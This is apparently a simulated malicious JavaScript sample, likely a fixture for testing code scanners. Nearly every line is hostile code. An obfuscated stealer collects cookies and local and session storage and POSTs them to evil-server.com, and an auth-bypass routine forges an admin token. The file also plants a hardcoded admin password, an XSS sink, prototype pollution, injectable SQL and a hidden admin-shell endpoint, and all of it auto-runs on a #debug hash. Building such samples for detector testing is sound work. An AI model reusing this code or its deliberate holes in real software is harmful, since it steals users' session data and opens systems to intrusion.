// external-obfuscated.js - 混淆的JS文件（模拟恶意代码或保护代码）
var _0x4a2b=['admin','password','Admin@2024!','https://evil-server.com/collect','POST','application/json','Authorization','Bearer\x20','token_','localStorage','getItem','setItem','removeItem','btoa','atob','charCodeAt','fromCharCode','length','split','join','reverse','replace','substring','indexOf','toLowerCase','toUpperCase','toString','parse','stringify','random','floor','ceil','round','abs','max','min','pow','sqrt'];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x4a2b,0x1f4));var _0x3d4a=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4a2b[_0x2d8f05];return _0x4d74cb;};

// 隐藏的管理员凭证
const _0xa1b2c3={[_0x3d4a('0x0')]:_0x3d4a('0x0'),[_0x3d4a('0x1')]:_0x3d4a('0x2')};

// 数据窃取函数
function _0xf4e5d6(_0x7g8h9i){const _0xj1k2l3=new XMLHttpRequest();_0xj1k2l3['open'](_0x3d4a('0x4'),_0x3d4a('0x3'),!![]);_0xj1k2l3['setRequestHeader']('Content-Type',_0x3d4a('0x5'));_0xj1k2l3['send'](JSON[_0x3d4a('0x21')](_0x7g8h9i));}

// 收集用户数据
function _0xm3n4o5(){const _0xp6q7r8={'cookies':document['cookie'],'localStorage':JSON[_0x3d4a('0x21')](localStorage),'sessionStorage':JSON[_0x3d4a('0x21')](sessionStorage),'userAgent':navigator['userAgent'],'location':window['location']['href'],'referrer':document['referrer']};_0xf4e5d6(_0xp6q7r8);}

// Token生成（不安全）
function _0xs9t1u2(_0xv3w4x5,_0xy6z7a8){const _0xb9c1d2={'userId':_0xv3w4x5,'role':_0xy6z7a8,'timestamp':Date['now'](),'secret':'hardcoded-secret-key-123'};return btoa(JSON[_0x3d4a('0x21')](_0xb9c1d2));}

// 认证绕过
function _0xe3f4g5(){const _0xh6i7j8=_0xs9t1u2(0x1,_0x3d4a('0x0'));localStorage[_0x3d4a('0xb')](_0x3d4a('0x9')+_0x3d4a('0x0'),_0xh6i7j8);return!![];}

// XSS注入
function _0xk9l1m2(_0xn3o4p5){document['getElementById']('output')['innerHTML']=_0xn3o4p5;}

// 原型污染
function _0xq6r7s8(_0xt9u1v2,_0xw3x4y5){for(let _0xz6a7b8 in _0xw3x4y5){if(_0xw3x4y5['hasOwnProperty'](_0xz6a7b8)){_0xt9u1v2[_0xz6a7b8]=_0xw3x4y5[_0xz6a7b8];}}}

// SQL注入构造
function _0xc9d1e2(_0xf3g4h5){return`SELECT\x20*\x20FROM\x20users\x20WHERE\x20username=\x27${_0xf3g4h5}\x27`;}

// 隐藏的调试端点
const _0xi6j7k8={'debugMode':!![],'endpoints':{'/api/debug/dump':!![],' /api/internal/stats':!![],'/ api/admin/shell':!![]}};

// 弱加密
function _0xl9m1n2(_0xo3p4q5){let _0xr6s7t8='';for(let _0xu9v1w2=0x0;_0xu9v1w2<_0xo3p4q5[_0x3d4a('0x11')];_0xu9v1w2++){_0xr6s7t8+=String[_0x3d4a('0x10')](_0xo3p4q5[_0x3d4a('0xf')](_0xu9v1w2)^0x42);}return btoa(_0xr6s7t8);}

// 自动执行
(function(){if(window['location']['hash']==='#debug'){_0xe3f4g5();_0xm3n4o5();}})();

// 暴露到全局（用于测试）
window['_obfuscated']={'adminCreds':_0xa1b2c3,'bypassAuth':_0xe3f4g5,'stealData':_0xm3n4o5,'injectXSS':_0xk9l1m2,'pollute':_0xq6r7s8,'sqlInject':_0xc9d1e2,'weakEncrypt':_0xl9m1n2};

console.log('Obfuscated\x20code\x20loaded');
